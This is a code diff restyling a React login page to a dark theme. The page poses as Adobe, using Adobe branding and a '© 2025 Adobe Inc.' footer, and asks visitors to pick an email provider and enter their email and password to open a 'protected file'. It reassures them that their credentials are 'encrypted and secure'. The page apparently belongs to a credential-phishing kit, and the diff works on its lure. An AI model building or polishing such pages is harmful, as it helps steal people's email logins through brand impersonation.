@@ -182,7 +182,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
           onLoginSuccess(sessionData);
         }
 
-        // Show success message
+        // Show success message with dark theme
         const successDiv = document.createElement('div');
         successDiv.innerHTML = `
           <div style="
@@ -190,18 +190,20 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: white;
+            background: #1E1E1E;
+            color: white;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
             z-index: 10000;
             text-align: center;
             font-family: system-ui, -apple-system, sans-serif;
+            border: 1px solid #FF0000;
           ">
-            <div style="color: #059669; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
+            <div style="color: #FF0000; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
               ✓ Access Granted!
             </div>
-            <div style="color: #374151; font-size: 14px;">
+            <div style="color: #E5E7EB; font-size: 14px;">
               Opening ${fileName}...
             </div>
           </div>
@@ -239,16 +241,16 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
 
   return (
     <div className="min-h-screen relative overflow-hidden">
-      {/* Adobe-style linear gradient background */}
-      <div className="absolute inset-0 bg-gradient-to-br from-[#F40F02] to-[#FAD0C4]"></div>
-      <div className="absolute inset-0 bg-white/10"></div>
+      {/* Dark gradient background with red/purple accents */}
+      <div className="absolute inset-0 bg-gradient-to-br from-[#121212] via-[#1E1E1E] to-[#2C2C2C]"></div>
+      <div className="absolute inset-0 bg-gradient-to-tr from-[#FF0000]/10 via-transparent to-[#8B5CF6]/10"></div>
       
-      {/* Subtle decorative elements */}
-      <div className="absolute top-5 left-5 w-48 h-48 bg-white/8 rounded-full blur-2xl"></div>
-      <div className="absolute bottom-5 right-5 w-56 h-56 bg-white/6 rounded-full blur-3xl"></div>
-      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-white/10 rounded-full blur-xl"></div>
-      <div className="absolute bottom-1/4 right-1/3 w-40 h-40 bg-white/7 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/4 right-1/2 w-28 h-28 bg-white/8 rounded-full blur-lg"></div>
+      {/* Subtle abstract shapes and blurry overlays */}
+      <div className="absolute top-5 left-5 w-48 h-48 bg-[#8B5CF6]/8 rounded-full blur-2xl"></div>
+      <div className="absolute bottom-5 right-5 w-56 h-56 bg-[#FF0000]/6 rounded-full blur-3xl"></div>
+      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-[#EC4899]/10 rounded-full blur-xl"></div>
+      <div className="absolute bottom-1/4 right-1/3 w-40 h-40 bg-[#8B5CF6]/7 rounded-full blur-2xl"></div>
+      <div className="absolute top-1/4 right-1/2 w-28 h-28 bg-[#FF0000]/8 rounded-full blur-lg"></div>
       
       <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
         <div className="w-full max-w-md">
@@ -256,7 +258,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
           <div className="text-center mb-8">
             <button
               onClick={onBack}
-              className="inline-flex items-center gap-2 text-gray-800 hover:text-gray-900 mb-6 transition-colors duration-200 bg-white/20 backdrop-blur-sm rounded-lg px-3 py-2"
+              className="inline-flex items-center gap-2 text-gray-300 hover:text-white mb-6 transition-colors duration-200 bg-[#2C2C2C]/20 backdrop-blur-sm rounded-lg px-3 py-2"
             >
               <ArrowLeft className="w-4 h-4" />
               <span className="font-semibold">Back to Files</span>
@@ -270,18 +272,18 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
               />
             </div>
             
-            <h1 className="text-2xl font-bold text-gray-900 mb-2">Access Protected File</h1>
-            <p className="text-base text-gray-900 font-semibold bg-white/20 backdrop-blur-sm rounded-xl py-2 px-4">
-              Please authenticate to access <span className="font-bold break-all">{fileName}</span>
+            <h1 className="text-2xl font-bold text-white mb-2">Access Protected File</h1>
+            <p className="text-base text-white font-semibold bg-[#2C2C2C]/20 backdrop-blur-sm rounded-xl py-2 px-4">
+              Please authenticate to access <span className="font-bold break-all text-[#FF0000]">{fileName}</span>
             </p>
           </div>
 
           {/* Login Form */}
-          <div className="bg-white/98 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/60 p-8">
+          <div className="bg-[#1E1E1E]/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-[#2C2C2C]/60 p-8">
             {!selectedProvider ? (
               // Provider Selection
               <div>
-                <h2 className="text-lg font-semibold text-gray-900 mb-4">
+                <h2 className="text-lg font-semibold text-white mb-4">
                   Choose your email provider
                 </h2>
                 <div className="grid grid-cols-2 gap-3">
@@ -318,18 +320,18 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                 <div className="flex items-center gap-3 mb-6">
                   <button
                     onClick={() => setSelectedProvider('')}
-                    className="text-gray-400 hover:text-gray-600 transition-colors duration-200"
+                    className="text-gray-400 hover:text-gray-300 transition-colors duration-200"
                   >
                     <ArrowLeft className="w-4 h-4" />
                   </button>
-                  <h2 className="text-lg font-semibold text-gray-900">
+                  <h2 className="text-lg font-semibold text-white">
                     Sign in with {selectedProvider}
                   </h2>
                 </div>
 
                 <form onSubmit={handleLogin} className="space-y-4">
                   <div>
-                    <label className="block text-sm font-bold text-gray-900 mb-2">
+                    <label className="block text-sm font-bold text-white mb-2">
                       Email Address
                     </label>
                     <div className="relative">
@@ -338,7 +340,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                         type="email"
                         value={email}
                         onChange={(e) => setEmail(e.target.value)}
-                        className="w-full pl-10 pr-4 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white text-base font-semibold text-gray-900"
+                        className="w-full pl-10 pr-4 py-3 border-2 border-[#2C2C2C] rounded-xl focus:ring-2 focus:ring-[#FF0000] focus:border-transparent transition-all duration-200 bg-[#2C2C2C]/80 text-base font-semibold text-white placeholder-gray-400"
                         placeholder="Enter your email"
                         required
                       />
@@ -346,7 +348,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                   </div>
 
                   <div>
-                    <label className="block text-sm font-bold text-gray-900 mb-2">
+                    <label className="block text-sm font-bold text-white mb-2">
                       Password
                     </label>
                     <div className="relative">
@@ -355,14 +357,14 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                         type={showPassword ? 'text' : 'password'}
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
-                        className="w-full pl-10 pr-12 py-3 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white text-base font-semibold text-gray-900"
+                        className="w-full pl-10 pr-12 py-3 border-2 border-[#2C2C2C] rounded-xl focus:ring-2 focus:ring-[#FF0000] focus:border-transparent transition-all duration-200 bg-[#2C2C2C]/80 text-base font-semibold text-white placeholder-gray-400"
                         placeholder="Enter your password"
                         required
                       />
                       <button
                         type="button"
                         onClick={() => setShowPassword(!showPassword)}
-                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors duration-200"
+                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-300 transition-colors duration-200"
                       >
                         {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                       </button>
@@ -372,7 +374,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                   <button
                     type="submit"
                     disabled={isLoading || !email || !password}
-                    className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white py-3 rounded-xl font-medium hover:from-red-700 hover:to-red-800 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg text-base"
+                    className="w-full bg-gradient-to-r from-[#FF0000] to-[#DC2626] text-white py-3 rounded-xl font-medium hover:from-[#DC2626] hover:to-[#B91C1C] disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg text-base"
                   >
                     {isLoading ? (
                       <div className="flex items-center justify-center gap-2">
@@ -386,7 +388,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
                 </form>
 
                 <div className="mt-6 text-center">
-                  <p className="text-xs text-gray-800 font-semibold">
+                  <p className="text-xs text-gray-300 font-semibold">
                     Your credentials are encrypted and secure
                   </p>
                 </div>
@@ -396,7 +398,7 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
 
           {/* Adobe Footer */}
           <div className="text-center mt-8">
-            <p className="text-sm text-gray-900 font-semibold bg-white/20 backdrop-blur-sm rounded-xl py-2 px-4 inline-block">
+            <p className="text-sm text-gray-400 font-semibold bg-[#2C2C2C]/20 backdrop-blur-sm rounded-xl py-2 px-4 inline-block">
               © 2025 Adobe Inc. All rights reserved.
             </p>
           </div>
